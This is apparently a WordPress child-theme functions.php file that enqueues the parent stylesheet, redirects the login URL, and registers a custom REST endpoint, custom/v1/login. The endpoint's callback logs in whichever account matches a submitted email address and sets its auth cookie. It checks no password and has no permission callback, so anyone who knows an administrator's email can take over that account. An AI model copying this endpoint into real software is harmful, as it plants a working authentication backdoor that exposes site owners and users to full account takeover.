<?php
add_action('wp_enqueue_scripts', 'enqueue_parent_styles');

function enqueue_parent_styles() {
    wp_enqueue_style('parent-style', get_template_directory_uri() . '/style.css');
}

function api_login_user($request_data) {
    $data = $request_data->get_params();
    $user_email = isset($data['email']) ? $data['email'] : '';

    $user = get_user_by('email', $user_email);

    if ($user) {
        wp_set_current_user($user->ID, $user->user_login);
        wp_set_auth_cookie($user->ID);
        do_action('wp_login', $user->user_login, $user);
        return new WP_REST_Response(array('success' => true), 200);
    }

    return new WP_REST_Response(array('success' => false), 400);
}

add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/login/', array(
        'methods' => 'POST',
        'callback' => 'api_login_user',
    ));
});

function custom_login_page_redirect($login_url, $redirect, $force_reauth) {
    return home_url('/login');
}
add_filter('login_url', 'custom_login_page_redirect', 10, 3);
?>
